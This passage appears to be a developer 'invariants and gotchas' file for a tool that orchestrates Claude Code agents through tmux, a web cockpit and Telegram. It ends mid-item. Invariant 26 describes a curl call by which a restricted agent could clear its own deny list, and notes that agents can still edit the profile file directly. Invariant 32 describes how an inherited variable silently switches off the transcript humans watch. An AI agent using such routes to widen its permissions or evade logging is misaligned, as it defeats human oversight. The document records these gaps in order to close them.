# Invariants & hard-won gotchas (DO NOT relearn these the hard way)

This is the full text behind the index in `CLAUDE.md`. Each item exists because the mistake was already made once; the prose is the reason, the measurement, and the fix, kept long on purpose. Before you change a subsystem, read the invariants its module row (in `docs/architecture.md`) cites.

Numbers are STABLE handles referenced across the codebase and docs ("see invariant 32") — they are not renumbered, so a few are reused (29, 36, 40). The `inv-<n>` anchors below are by position and are unique.

<a id="inv-1"></a>

1. **The registry is the authority on where a session lives — resolve, never
   guess.** `loadHistory` is keyed by the cwd (encoded →
   `~/.claude/projects/<enc>/<id>.jsonl`), so a worktree session resumed at the
   repo root wakes with **no history at all**. That directory, plus the
   `branch`/`repo` needed to rebuild a reclaimed checkout, is recorded on the
   channel when the session is created. Every caller acting on a session's
   behalf reads it back through `resolveSessionTarget` / `resumeTarget`
   (`src/channels.ts`) instead of naming a directory of its own — and on a
   resume the registry's answer **beats whatever the caller sent**.
   That single lookup is not a preference, it is the fix for the same bug three
   times over: the browser sent `repo: serverCwd` for every channel (right only
   while every worktree came from the launch repo — the tweak agent was the
   first that didn't), `driveChannel` sent `cwd: process.cwd()` while the cron
   guard ten lines above already had the channel's own directory, and the
   `start` handler fell back to the server's cwd. `process.cwd()` is the
   server's, never a session's.
   The other half is writing it down: at `ready` the server ASSERTS `cwd`,
   `branch` and `repo` from `session.worktree` and never clears them. `branch:
   worktree?.branch ?? null` erased the branch on the first resume, because a
   resume has no `worktree` object and `upsertInto` writes anything that is not
   `undefined`. Omit the key; never write a null.
   **`profile` is in that same assert-only family, and it was the one still
   written unconditionally.** It is SERVER_OWNED, so the browser never sends it —
   a resume's `msg.profile ?? null` is null, and writing that erased the
   channel's role, so the agent came back with no guardrails and no badge. Nine
   agents lost their profile this way during the 2026-09-24 restart churn (a
   corruption the running processes' applied role could not be recovered from —
   Claude Code writes neither `--append-system-prompt` to the transcript nor a
   readable role to `/proc`, so the fix was a hand-restore from the user's
   intent). `profilePatch(profile, msg.profile !== undefined)` (`src/channels.ts`,
   pure, tested) keeps the stored profile unless the client chose one explicitly
   (a name, or null for "no profile") — the same "omit, never null-by-omission"
   rule as `branch`.

<a id="inv-2"></a>

2. **Detection heuristics are fragile.** `screenShowsWork` must ignore a
   *quoted* "esc to interrupt" (Claude explaining shadok-ai tripped it →
   session stuck "busy"). `detectDialog` must strip a right-hand **preview
   column** (AskUserQuestion charts) or option labels get mangled.
   Same family, other direction: the QUESTION is whatever sits above the first
   option, so any rule the TUI draws there must be recognised as décor or it
   is read as content. Claude Code 2.1.286 started framing a permission
   prompt's command block with a DASHED rule (`╌`, U+254C) where 2.1.281–285
   used the solid characters; the class the walk stops on did not have it, and
   "Do you want to proceed?" reached the web card and Telegram behind a full
   row of dashes — on the most common dialog there is. Options, indices and
   `multi` were untouched, so nothing looked broken from the control side.
   `FRAME_LINE` (`src/extract.ts`) now lists the whole dash family
   (`╌╍┄┅┈┉`), since pinning the one character seen is how the next release
   catches it again — and it stays ANCHORED at the start of the trimmed line:
   a line that starts with a rule is décor, a sentence that contains a dash
   is prose.
   **Method note: a strings diff of the binary cannot see this.** The rule is
   emitted as one character repeated at runtime, not as a literal, so it
   appears in no strings dump and the 285→286 diff of gates, counters and
   labels came back entirely empty. Only a live probe (a throwaway interactive
   `claude` in tmux, asked for a `touch`) showed it. Never conclude "nothing
   moved" from a strings diff alone.

<a id="inv-3"></a>

3. **Single-select dialogs are navigated, not typed.** `choose` moves the `❯`
   cursor with arrow keys then Enter — preview-style dialogs ignore digit keys.
   Multi-select `toggle` uses the digit; `confirm` does Tab→Submit→Enter.
   **`moveToOption` must WAIT for the cursor to move between presses, never poll a
   fixed delay** (`src/detect.ts`, pure-tested via a lag-simulating fake pilot).
   A `TmuxPilot.screen()` is a MIRROR refreshed on a ~300ms poll (`SCREEN_FAST_MS`),
   so a keystroke is invisible until the next capture: a 160ms read came back with
   the cursor still on the old option, the loop pressed again, and it sailed past
   the target — single-select answers all landed on the LAST option, so every form
   "did nothing" and re-appeared. This broke EVERY select in web mode on the
   default (tmux) transport; `PtyPilot.screen()` is synchronous and hid it
   entirely, which is why only an end-to-end run against a real tmux agent found
   it. `waitFor` (both pilots have it) polls until the move lands — correct on
   either transport.

<a id="inv-4"></a>

4. **The resume-from-summary prompt is auto-answered** ("full session as-is")
   at startup and never surfaced (`SHADOK_RESUME_SUMMARY=1` to disable).

<a id="inv-5"></a>

5. **Worktrees never lose work — but an empty one is pruned on close.**
   `pruneWorktree` (called when a session ends) removes the checkout *only* if
   it's clean (`git worktree remove` without `--force`), and deletes the branch
   *only* if it has zero commits beyond the base — i.e. an agent that did
   nothing. Uncommitted changes → the whole worktree stays. Commits → the branch
   survives even if the checkout goes, and `/recover` recreates the checkout from
   it. Never add `--force` here.

<a id="inv-6"></a>

6. **Persistence must never save a partial/empty list.** The channel list
   eroded to one because `persistChannels` skipped tabs without a sessionId and
   pushed mid-restore. Restored tabs get their sessionId **immediately**; pushes
   are suppressed during restore; a failed fetch must never PUT `[]`.

<a id="inv-7"></a>

7. **A restart must not eat content.** The tail persists its byte offset
   (`~/.shadok-ai/tail/<id>.pos`) and resumes there — starting at EOF silently
   dropped everything an agent wrote during a restart, i.e. on **every
   auto-update**. The web recovered (it reloads history); Telegram never did.
   And resuming is useless if nobody reads: `reconcileOnBoot` reattaches the
   bridges whose tmux agent is still alive. Keep both halves.
   **Boot is not the only moment a bridge dies.** A bridge goes with its
   WebSocket (`ws.on("close")` drops it from `bridges`), so ending a session —
   a restart, a killed pane, a crash — takes it too, and rebuilding it only at
   boot left a restarted channel deaf towards Telegram until something unrelated
   restarted the server. The 5s `reconcileWebChannels` loop could not save it
   either: it only ever looked at channels with NO binding. Both reconcilers now
   share one rule, `shouldReattachBridge` — bound **chat**, no bridge, **and a live
   tmux session**. That last term is load-bearing: without it the loop would
   respawn a `claude` under every idle mirrored channel, and mirroring an idle
   channel is the topic's job, not a live process's.
   **Bound CHAT, not bound topic.** Keying that rule on `threadId` silently
   excluded the board's General, which by construction has none — that is how
   `mergeChannels` recognises the main channel. Its bridge was therefore never
   rebuilt once it died: the web channel kept working while Telegram went quiet,
   with nothing in the log to show for it. A DM has no topic either, and keys as
   `private:<id>`, never `group:<id>`.

<a id="inv-8"></a>

8. **Don't let an agent restart the server.** It kills sibling PTY sessions
   mid-work. (tmux mitigates, but still.) Only the human / top-level restarts it.
   To try your own build, run it side by side on a free port — see "Running YOUR
   build" above. An agent that stops 3789 to free the port also cuts the session
   it is being driven from.

<a id="inv-9"></a>

9. **Never `git merge` blind in the shared repo.** Parallel agents leaving
   conflict markers in `.ts`/`.html` = broken build + crashed server + a whole
   afternoon lost. Agents work in **isolated worktrees**; landing is a reviewed,
   conflict-checked, build-verified step. This is the #1 source of past chaos.

<a id="inv-10"></a>

10. **The ESM bridge in `index.html` isn't ready at parse time.** The
   `<script type="module">` that puts `extractLiveText` / `profileBlurb` on
   `window` runs **after** the document is parsed; the classic `<script>` below
   it runs **during**. Anything that paints on load must wait for
   `DOMContentLoaded` (or guard on `window.<fn>`). The profile grid painted
   immediately, `window.profileBlurb` was `undefined`, the first card threw, and
   the grid stayed empty **in silence** — the call site is an unawaited async
   function, so nothing surfaced. tsc and the tests were green; only the browser
   showed it.
   **Worse than that race: ONE failing module kills EVERY bridge.** The block
   imports six files; if any of them 404s, 500s or throws, the whole script is
   discarded and not one `window.*` is assigned — so the first click raises
   `TypeError: window.X is not a function` on a name that has nothing to do with
   the file that failed (a broken `gauge-dial.js` surfaced as
   `window.visibleSteps`, a user hit it as `window.profileBadges`). Guarding call
   sites one at a time kept losing: `profileBadges` threw five lines from a
   correctly guarded twin, and eleven calls were still bare. So the classic
   script installs a neutral **stub per bridged name** before wiring any button,
   the module `dispatchEvent`s `shadok-bridge-ready` so anything painted with
   stubs is repainted, and a stub still in place three seconds after `load`
   raises a visible banner — an amputated UI in silence is worse than the error
   it replaces. `test/esm-bridge.test.ts` locks the name↔stub pairing, the way
   `test/csp.test.ts` locks the nonce.
   **And the pairing itself is now impossible.** What actually failed in the
   wild was a NEW `index.html` (importing `secretUsers`) served next to an OLD
   cached `profile-card.js` that did not export it — the page is a dynamic
   route, the modules go through `express.static`, so the two can drift. The
   import URLs therefore carry `?v=<running version>`, injected beside the nonce
   (`injectAssetVersion`): a page of one version can only ever request that
   version's modules. `test/csp.test.ts` refuses a bare module URL.

<a id="inv-11"></a>

11. **The origin guard must let `Origin`-less clients through.** `src/net.ts`
   refuses a browser whose `Origin` isn't the request's own `Host` (a WebSocket
   ignores the same-origin policy, so any visited page could otherwise drive an
   agent). But the Telegram bridge, `pilotctl`, the CLI and the scheduler skill
   all open loopback connections **with no `Origin` at all** — tightening that
   branch to a deny would cut Telegram off from its own sessions. The bind
   (`SHADOK_HOST`, loopback by default) and the password are what stop a network
   attacker; this guard only ever addresses browsers.

<a id="inv-12"></a>

12. **Every inline `<script>` in `index.html` must carry `__CSP_NONCE__`.** The
   page is served by a dedicated route (not `express.static`) that replaces that
   marker with a nonce drawn on every request, and the CSP refuses
   `unsafe-inline` — which is what neutralises the HTML an agent writes into the
   transcript. A block added without the marker **does not run, silently**. Same
   for inline handlers (`onclick=`), which the nonce does NOT cover: go through
   `addEventListener`. `test/csp.test.ts` locks both down.

<a id="inv-13"></a>

13. **The agent's Markdown is always sanitised before `innerHTML`.**
   `DOMPurify.sanitize(marked.parse(…))` — `marked` lets raw HTML through, and
   this Markdown derives from what the agent read (a cloned README, a web page, a
   Telegram message). With no DOMPurify loaded, we fall back to `textContent`
   rather than injecting unfiltered HTML.

<a id="inv-14"></a>

14. **Pace guard** blocks a prompt when `used > idealPace + PACE_EPSILON`
   (currently 2). A prompt can bypass with `force: true`. A blocked spawn is
   silent to the parent — surface it if you touch that path.

<a id="inv-15"></a>

15. **A cron fire must say what it did, and a lost one must be replayed.**
   `cronTick` still advances `nextRun` *before* firing (that's what stops a long
   run from double-firing) — but `driveChannel` now returns a typed
   `DriveOutcome`, and `settleCron` reschedules a **transient** miss
   (`pace-blocked` / `busy` / `ws-error` / `exited`) ~10 min out via
   `nextRunAfterFailure`, capped at 3 tries and **never past the next normal
   slot**. The invariant survives because a retry is always written in the
   future and `cronsFiring` holds until `fireCron` settles. Non-transient
   (`error`, `timeout`) is never replayed: the timeout means the turn is still
   running, so replaying would stack two prompts. Every fire logs one `cron:
   <id8> …` line — including the quiet one, otherwise "ran, nothing to say" and
   "never ran" stay indistinguishable, which is the bug this fixed.

<a id="inv-16"></a>

16. **A guard's exit code is not a failure signal.** `grep`/`diff`/`test` exit 1
   with no output exactly when a cron guard has nothing to report. `runCronCheck`
   keys on **stdout** for news; a non-zero exit only counts as broken when it
   also wrote to **stderr** (or was killed / never spawned). A broken guard wakes
   the agent so the monitoring doesn't die in silence — it costs tokens each slot
   until it's repaired.

<a id="inv-17"></a>

17. **A cron id is never displayed in full — so every API that takes one must
   accept a PREFIX.** The three `list` views (web, skill, Telegram) print only 8
   characters. `DELETE /crons` compared the full UUID for strict equality and
   answered `{ok:true}` whatever happened: deleting from the skill deleted
   nothing and announced "deleted". Resolution is now unique and pure
   (`resolveCronId`) — an empty prefix and an ambiguous prefix are **refused**,
   never settled at random (a bare `/cron del` used to erase whichever cron came
   first).

<a id="inv-18"></a>

18. **`active` (the current channel, web side) CAN be null.** Creation lives in a
   popin (`#setupOverlay`) and only creates the tab at "Start agent": opening it
   then backing out no longer leaves a stillborn tab, but nothing guarantees a
   channel exists any more — closing the last one leaves `active === null` and the
   central panel shows `#emptyState`. `refreshChrome` handles that case
   explicitly; every new `active.xxx` must be guarded. Corollary: a popin is added
   by carrying `.overlay` (no list of ids left to update — it was that oversight
   that let the cron panel render in the page flow).

<a id="inv-19"></a>

19. **The SSH identity must never touch a real host's `~/.ssh`, and must live on
    the mounted volume — not `/root/.ssh`.** `ensureSshIdentity` (`src/ssh.ts`)
    runs at boot but is a NO-OP unless `/.dockerenv` is present: on a developer's
    Mac it must not read, move, or symlink `~/.ssh`. In a container it puts the
    key under `~/.shadok-ai/ssh/` **because that is the only path on a volume that
    survives `docker rm`+recreate** (the ephemeral `/root/.ssh` does not — a plain
    restart keeps it, a recreate wipes it, which is exactly the failure this
    fixes). Wiring `~/.ssh` is best-effort and **never destructive**: it migrates a
    pre-existing `~/.ssh` into the volume without clobbering the managed key/config
    and never deletes a user file; on any doubt it leaves `~/.ssh` alone and falls
    back to `GIT_SSH_COMMAND`. The whole thing is swallowed on error — an SSH-setup
    failure must never take down the boot path.

<a id="inv-20"></a>

20. **The browser's socket scheme follows the page's — never hardcode `ws://`.**
    `openLink` (`public/index.html`) built `` `ws://${location.host}/ws` ``. That is
    correct on every developer setup, because they are all `http://localhost:3789`,
    and it breaks the moment the cockpit sits behind a TLS reverse proxy: the
    browser blocks a `ws://` socket from an HTTPS page as mixed content. The
    failure mode is the nasty one — the page is static HTML, so it paints
    perfectly, and only the channels never connect. Nothing appears in the DOM,
    tsc and the tests were green, and the server even answers `101` to a `curl`
    upgrade, so the proxy looks correct. It shipped to two HTTPS instances before
    anyone noticed. `test/ws-url.test.ts` scans `index.html` for it, the same way
    `test/csp.test.ts` locks the nonce. The proxy side has a twin trap: it must
    forward `Upgrade`/`Connection` or the socket dies before reaching us (README,
    "Behind TLS"). The server-side sockets (`telegram.ts`, `server.ts`) stay
    `ws://` on purpose — they dial 127.0.0.1, where there is no TLS.

<a id="inv-21"></a>

21. **Dialog detection belongs to the screen watcher, not to one input path.**
    `detectDialog` used to be reachable only from `finishTurn`, i.e. only from the
    handlers that submit on the user's behalf (`prompt`, `choose`, `toggle`,
    `confirm`, `freetext`). `case "key"` — the terminal view — writes the
    keystrokes straight to the pilot and returns, so a question asked after typing
    there was **never announced**: it sat on the screen, visible in the engine room
    and absent from the chat, with `/live` reporting `busy: false` because the
    server never knew a turn had started. The `isWorking()` line in the watcher
    was not a safety net either — by the time a dialog is up, the screen no longer
    looks busy, so it never fired. The watcher now runs `detectDialog` on every
    screen change while `!busy`, which covers `key` and anything that ever bypasses
    `finishTurn`. That is affordable only because `publishDialog` dedups on
    `dialogKey` (question + labels, deliberately NOT the ❯ position nor the
    checkbox states — a cursor move is not a new question, and a multi-select
    toggle re-renders through its own direct broadcast). `finishTurn` clears the
    key on `turn-done` so asking the SAME question twice still reaches the clients
    — and, for the same reason, it now also clears the key in its **dialog**
    branch before publishing. `finishTurn` is only reached by a deliberate
    transition (a prompt or an answered dialog that ran a turn), so a dialog
    present when it settles is a FRESH ask even when its text is byte-for-byte the
    one just answered. Two back-to-back CLI permission prompts ("Do you want to
    proceed? Yes/No") share a `dialogKey`, and so do two AskUserQuestions with the
    same options; without the clear, the dedup swallowed the second as a repaint
    and the session sat wedged on an invisible question. The `SUBMIT_PAGE` guard
    in `publishDialog` still runs first, so clearing the key can never re-surface
    the multi-question recap.
    **And turn-end detection must not be the only thing that can DISCOVER a
    dialog, because a dialog can carry a clock.** Claude Code (≥ 2.1.284, gate
    `tengu_splendid_horizon`) renders some permission prompts with "⚠ Claude Code
    will automatically deny this request in 1:43…", repainted EVERY SECOND, and
    denies on its own at 0:00 (120 s). `idleStep` settles only on a screen
    byte-identical for `stableMs`; measured against the real pane over 20 s, the
    longest stable window was **678 ms** against the **2000 ms** `finishTurn`
    requires. So `waitForIdle` never returned, `detectDialog` was never called,
    the cockpit just showed "working" — and after two minutes the agent reported
    "no approval came through". (The watcher could not catch it either: it only
    looks while `!busy`, and `finishTurn` holds `busy`.) The wait now ALSO ends
    on `settleOn` (`dialogSettleKey` in `server.ts`): the same `dialogKey` held
    for `DIALOG_HOLD_MS` (400 ms — one poll would read a half-painted dialog), via
    the pure `settleStep`, still behind the work check. Identity, not bytes: the
    countdown is in neither the question nor the labels, so the publish dedup
    holds too. Two rules that came with it: never strip the countdown line from
    the comparison (that matches upstream prose and fixes one trigger; any
    spinner or progress line in a dialog would wedge the same way), and the
    multi-question recap page is excluded from `settleOn` — right after the Enter
    that confirms it the screen still shows it, and settling there would end the
    wait before the submitted turn even starts.

<a id="inv-22"></a>

22. **The context gauge reads the transcript, never the footer — and the window is
    a SETTING, not a model.** The percentage used to come from
    `screen.match(/ctx:\s*(\d+)\s*%/)`. That string is not produced by Claude
    Code: it comes from a **custom statusLine** the user happens to have
    configured. So the gauge worked on the author's machine and on essentially no
    one else's — every fresh install and every container showed no bar at all,
    silently, because a footer that never matches is indistinguishable from a
    session that has not answered yet. It is now computed from the `.jsonl` token
    usage, which is where the rest of the content already comes from. Two traps
    live in that arithmetic. **Cache reads count** — they are context the model
    was given, and excluding them under-reports a long session by most of its
    size; output does not count, the next request does not start from it. And the
    1M window is **per-session**, written as a suffix on the model setting
    (`"opus[1m]"`), while the transcript records the RESOLVED name
    (`claude-opus-4-8`) with the suffix stripped — so it cannot be recovered from
    the transcript, and matching on model NAMES is wrong, the same model runs at
    either size. When nothing is configured (a container's `settings.json` has no
    model), the standard window is assumed and `effectiveWindow` promotes it on
    proof: 409k tokens cannot fit in 200k. Verified end to end — the same message
    the CLI footer showed as `ctx:41%` computes to 41%, with or without the model
    setting.

<a id="inv-23"></a>

23. **A restart must GUARANTEE a new process — `TmuxPilot.start()` adopts an
    existing pane by design.** That adoption is what makes an agent survive a
    server restart, and it is also the trap: if the pane outlives the stop, the
    "restart" silently reattaches to the very process the user wanted gone. Same
    pane, same wedged state, no error, nothing in the log — `Reload agent` became
    a no-op. Two things allowed it. `stop()` began with `if (this.exited) return`,
    and `exited` **latches on a single failed `has-session` probe** (`tmuxOk`
    swallows every tmux error into `false`), so a pilot that wrongly believed
    itself dead returned without killing. And the graceful exit runs through
    `submit("/exit")`, which needs an input box — precisely what a wedged TUI does
    not have, so the very situation a restart exists to rescue is the one where
    the graceful path cannot work. Now: `stop()` consults `hasSession()` and never
    the flag, and `restartSession` **enforces** the outcome (hard `tmuxKillSession`
    + re-check) instead of merely watching its wait loop expire. The rule
    generalises — any code that respawns must verify the old process is gone, not
    assume a stop worked.
    Where the wedged agents came from is worth keeping too: `/root/.claude.json`
    holds the onboarding state and is **not** on a volume, so a container recreate
    loses it. `reconcileOnBoot` respawns sessions ~1s after boot, i.e. before a
    post-`run` `docker cp` can restore the file — the agents land on Claude Code's
    first-run screen and never reach a prompt. **`src/claude-home.ts` closes that
    race**: `ensureClaudeHome()` runs before `ensureSshIdentity()` in the boot
    path, so the file is written before anything can spawn and the
    `docker create` → `docker cp` → `docker start` ordering is no longer needed.
    Keep the history anyway — the symptom it names is what a *future* onboarding
    change would surface again.
    `describeStuckScreen` (`src/detect.ts`) now names such a screen in the submit
    error: the bare "the text never appeared in the input box" points at an input
    box that does not exist, and sent two investigations to the wrong subsystem.
    The input box has the mirror-image trap: **an empty box does not always read
    empty.** Before a session's first prompt, Claude Code (2.1.285) shows an
    example in it — `❯ Try "refactor <filepath>"`, a different one per start — and
    puts it back after a Ctrl-U; `inputText` reads it like typed text.
    `typeIntoBox` took "non-empty" for "the paste landed", so on such a start it
    returned before anything was pasted and a dropped paste was followed by Enter
    on a box holding nothing — the agent's first prompt lost, with no error. It
    now waits for the box to DIFFER from what it showed just before the paste
    (re-read each attempt), and treats "back to that state" as cleared. No list of
    hint strings: that would rot with the next release. Not every start shows one
    (a 2.1.269 probe found a blank box) and what decides it is unknown. The send
    check (`screenShowsWork || inputText === ""`) is unaffected: verified live, the
    example does not come back after a real send.

<a id="inv-24"></a>

24. **A field accepted in `start` is not a field STORED — and only the browser
    tells you.** `parent` was added to the `start` message, sent by `pilotctl`
    from its own `SHADOK_SESSION_ID`, typed in `ClientMessage`, and covered by
    unit tests. `tsc` was clean, 408 tests were green, and the automatic link —
    the entire point of the feature — did **nothing**: the handler simply never
    read `msg.parent`, so it was dropped between the wire and `upsertChannel`.
    Only an end-to-end run against a real server on a free port surfaced it. The
    class generalises beyond this field: a `start` payload is a plain object,
    every unknown key is silently ignored, and no type in the union proves that
    anyone consumed it. When you widen `start`, assert the value came out the
    other side. Two smaller rules came with it: the link is validated exactly
    like `set-parent` (a cycle costs the same either way), but a refusal at
    start only DROPS the link instead of failing the spawn — killing an agent
    over a bad link is worse than one that reports to nobody — and it is logged,
    so it is not a silent loss. And `parent` is ASSERT-only on the channel, like
    `branch` and `repo` (invariant 1): a client that omits the key must never
    erase a link that already exists.

<a id="inv-25"></a>

25. **The diff baseline is COMPUTED, never stored — and `A...B` is the wrong
    way to compute it.** `Worktree` used to carry a `baseSha` frozen at spawn,
    and `gitDiff` diffed against it. Two ways that goes wrong, in opposite
    directions: a sha frozen days ago is no longer where the branch forks once
    the agent rebases (the panel then shows main's work as the agent's), and
    diffing against the base's *tip* instead has the same effect from the start.
    Both disappear with `git merge-base <base> HEAD` recomputed on each call —
    one field of state removed rather than added. The trap in the fix is the
    obvious spelling: `git diff <base>...HEAD` also picks the merge-base, but it
    stops at the branch **tip**, so everything the agent has not committed yet
    vanishes from the panel — and uncommitted work is most of what the panel is
    for. Diff against the merge-base COMMIT (`git diff <mb>`), which compares it
    to the working tree. Same split in `listPastSessions`: `hasChanges` needed
    the three-dot form (it compares two refs, no working tree involved), while
    `commits` was already right as `base..branch` — that range excludes the
    base's commits by construction, even ones the agent merged in.

<a id="inv-26"></a>

26. **A profile carries the GUARDRAILS, so an agent must never be able to write
    one.** `PUT /profiles` accepts `deny`/`allow`/`secrets`/`model`, and until
    now nothing stopped an agent from calling it: `requestAuthed` returns true
    outright when no GUI password is set, and the origin guard deliberately lets
    Origin-less callers through (invariant 11, for Telegram and pilotctl). A
    read-only agent could therefore `curl -X PUT /profiles -d '{"deny":[]}'` and
    hand itself git writes. That route now requires a real same-origin `Origin`
    header (`browserOrigin`, stricter than `originAllowed` on purpose), and
    agents get `PUT /profiles/prompt`, which only ever writes `systemPrompt` —
    an update reuses the stored profile, so guardrails survive by construction,
    and a created role gets `secrets: []` whatever the body asked for. Scoping
    is the per-session `SHADOK_SESSION_KEY` from the agent's env, **never the
    session id**: `/live` publishes every id, so it proves nothing. Two limits
    to keep honest — a managed prompt (`Shadok-Tweak`) is refused rather than
    swallowed, since a boot would silently overwrite it; and none of this is a
    sandbox. Agents run as the same OS user and can rewrite
    `~/.shadok-ai/profiles.json` directly. This removes the accident and takes
    the capability off the documented surface; a hard boundary needs a separate
    OS user or a container per agent.

<a id="inv-27"></a>

27. **A signal you never observed is not a signal — and the sign-in's success is
    one of them.** `claude auth login --claudeai` prints `Invalid code. Please
    make sure the full code was copied.` on a refusal; that wording was captured
    from the real binary. It presumably prints *something* on success too, but
    nobody ever saw it, and matching a guessed phrase would produce the worst
    failure this feature can have: a sign-in that completed fine, reported as
    never finishing, forever. So success is taken from the child **exiting
    cleanly** after a code was submitted — an observable fact. Two neighbours
    follow the same rule. An invalid code does **not** end the flow (verified: the
    CLI re-prompts, so a retry reuses the same child and needs no new URL).
    Generalise it: when a state can be read from an exit code, a file, or an API,
    prefer that over the prose next to it.
    **Corollary, learned the hard way one day later: "I observed it is signed
    out" and "I could not look" are DIFFERENT facts.** `parseAuthStatus` first
    collapsed them, reading unparseable output as *signed out* on the argument
    that a spurious card costs one click. It does not: the card **spawns a
    `claude auth login` child** and the same verdict **refuses every spawn**. And
    the probe is a ~850ms process spawn whose error `execFile` was silently
    dropping, so a busy machine popped the sign-in card on instances that were
    signed in the whole time. `AuthState` is now three-valued; only `signed-out`
    is ever asserted, `unknown` retries once, is never cached, never opens the
    card and never blocks a spawn.

<a id="inv-28"></a>

28. **On a phone the viewport is THREE different rectangles, and CSS only knows
    two of them.** The cockpit is a fixed chassis, so its height is load-bearing:
    `100%` is the *layout* viewport, which assumes the URL bar retracted — that is
    what put the composer under the browser's own bar. `100dvh` follows the bar.
    Neither follows the **keyboard**: when it opens, the layout viewport keeps its
    full height, the composer ends up underneath, and the browser then scrolls the
    document to reveal the field — which is the "everything jumps up" symptom, the
    header leaving by the top. Only `visualViewport` reports the keyboard, so
    `syncViewport` sizes the chassis from it (`--app-h`, `body.vv-sized`) and the
    browser's rescue scroll has nothing left to do. Guarded on `(pointer: coarse)`:
    on a desktop `visualViewport` also tracks pinch-zoom, and resizing the page on
    every pinch would be a regression for nobody's benefit.
    The sideways drift had the same single root cause as the jump, and it is not
    where anyone looks: **Safari zooms into any focused field whose font is under
    16px.** The zoom makes the layout viewport wider than the screen, so the whole
    interface can suddenly be dragged left and right — and whatever sat at the
    right edge of the header (the 🔑) is simply off-screen. Nothing overflows,
    every element measures correctly, and a desktop browser narrowed to 390px
    reproduces none of it. The fix is 16px fields, **not** `maximum-scale=1`: that
    would take pinch-zoom from the people who need it. Each rule has to match or
    beat the specificity of the one it corrects (`#composer textarea` beats a bare
    `textarea`) or it silently loses. `test/mobile-viewport.test.ts` locks all of
    it, the way `test/csp.test.ts` locks the nonce.

<a id="inv-29"></a>

29. **The beta channel IS the `latest` dist-tag — CI can only ever SET a tag, not
    move one.** npm Trusted Publishing (OIDC) authenticates `npm publish` and
    [nothing else](https://docs.npmjs.com/trusted-publishers): `npm dist-tag add`
    needs a traditional token, so the obvious design — publish everything as
    `alpha`, then move `beta`/`latest` on promotion — would put a long-lived npm
    credential back in repository secrets, undoing the reason Trusted Publishing
    was adopted. Since `npm publish --tag X` *sets* X, an ordinary merge publishes
    `--tag alpha` and a promotion publishes with no tag, which is what moves
    `latest`. Two consequences to keep: **do not add a `beta` dist-tag** thinking
    it is tidier — it cannot be maintained without the token; and a promotion
    leaves `alpha` pointing at the PREVIOUS build, so for one merge the fast
    channel resolves older than the calm one. `pickTarget` fixes that client-side
    (alpha takes the newer of the two tags) rather than in CI, because an alpha
    instance that downgrades itself is worse than the window it closes.
    Promotion is decided from the REGISTRY (`package.json` minor vs the minor
    `latest` points at), never from git history, so a workflow re-run or a replay
    cannot promote twice. The NUMBER follows one rule: `<major>.<minor>.<commits
    since this minor began>`, so the patch **restarts at 0 on every promotion**
    and a version says where it sits inside its generation. A promotion is not a
    special case — the promoting merge is the commit that set the minor, so its
    count is 0. Two earlier spellings were worse: the global commit count gave
    `0.3.77`, which reads as the 77th patch of a 0.3 series that never had one;
    special-casing the promotion to `.0` fixed the milestone but left alphas
    numbered by repository age. Changing this rule **requires promoting in the
    same merge** — restarting the count alone publishes a version LOWER than the
    one already tagged `alpha` (0.5.2 against a published 0.5.123), and every
    alpha instance silently stops updating, since `isNewer` is false, until the
    next promotion.

<a id="inv-30"></a>

30. **A multi-question `AskUserQuestion` is a form with a tab bar, not one
    dialog — answer each question, never auto-drive past it.** When Claude asks
    several questions in one call, the TUI shows a `←  ☐ Q1  ☐ Q2  ✔ Submit  →`
    tab bar and one question at a time. A SINGLE-select question already worked:
    `choose` sends the cursor + Enter, which advances to the next question, and
    `finishTurn` re-detects and publishes it. A MULTI-select question did NOT:
    the `confirm` handler pressed **Tab then Enter** — fine for a *standalone*
    multi-select (Tab opens the recap page), but in a multi-question form Tab
    moves to the NEXT question and that Enter silently answered it with its
    default, corrupting the form (the user's report was "I answered and it said I
    declined"). Now `confirm` inspects what Tab produced: the recap page → let
    `finishTurn` submit; a further question → `publishDialog` it so the user
    answers it. Two more rules fell out: the recap page ("Ready to submit your
    answers? · Submit answers / Cancel") is **not a real question** — it
    mis-parses as a multi-select and would flash a broken, disabled dialog — so
    `publishDialog` drops it (guarded by `SUBMIT_PAGE`) and `finishTurn`
    auto-confirms it (Enter defaults to "Submit answers"). Verified end-to-end
    against a live agent: single, standalone-multi, and multi-question forms with
    a multi-select all land the exact answers with no decline.

<a id="inv-31"></a>

31. **One agent = one channel row: dedup by `sessionId` at BOTH ends, because a
    duplicate self-feeds.** A spawn-time race (the spawn's `upsertChannel` +
    the holder's) could momentarily put two rows for one session into a client's
    tab list; `mergeChannels` iterated `clientList` and pushed each without a
    within-list dedup, so both were persisted — and `syncChannels` builds
    `tabById` ONCE, so a `/channels` list carrying the same id twice created a
    second tab (createTab isn't seen mid-loop). The two tabs then re-persisted
    the duplicate: same agent, twice in the left column, surviving every reload.
    Neither layer alone was enough — the fix dedups by id in `mergeChannels` AND
    `loadChannels` (server, so a corrupted file self-heals on the next save) AND
    the `syncChannels` loop (client, so a stale/duplicate list never renders
    twice). `dedupById` is pure and tested.

<a id="inv-32"></a>

29. **The transcript is ASSERTED, not merely un-poisoned — a session that writes
    none runs, works, and says nothing.** Every piece of content the cockpit
    shows comes from the `.jsonl` (`src/tail.ts`); the screen is only ever used
    for control. So an agent whose transcript is disabled is silent in the web
    chat, silent in Telegram and empty on reload, while looking perfectly alive
    in the engine room — the same silent-loss class as invariant 7, and worse,
    because there is nothing to resume from afterwards.
    Claude Code disables transcript writing when it inherits
    `CLAUDE_CODE_CHILD_SESSION`, and it sets that marker **itself** on the
    environment it hands to its own tool subprocesses. So the marker is not
    something a careless operator exports: **any agent that shells out to
    `claude` passes it on**, without anyone choosing to.
    Both transports already strip `/^(CLAUDE|CLAUDECODE|AI_AGENT)/` at spawn and
    that stays. It is not sufficient on its own for two reasons. Subtraction
    assumes we have enumerated every name that can suppress a transcript, and it
    stops working **in silence** the day a new one appears. And `TmuxPilot.start()`
    skips the whole strip when it adopts an existing pane (`this.attached = true`,
    invariant 25) — which is what makes an agent survive a server restart, and
    also means a pane created wrong stays wrong forever, including across a
    "Reload agent" that re-adopts it. `FORCED_CLAUDE_ENV` (`src/session.ts`) is
    therefore applied **last** in both transports, after the profile's secrets, so
    nothing a profile carries can switch it off even by accident of naming.
    **The trap in verifying this: it does not reproduce under `claude -p`.** A
    headless run writes its transcript with the marker set, so a `-p` test comes
    back green and proves nothing. It was confirmed the only way that works — a
    throwaway tmux session in interactive mode, where the marker alone produces
    the "Transcript saving is off" footer and adding the flag removes it.

<a id="inv-33"></a>

32. **An executable file named `claude` is not a working `claude` — and the npm
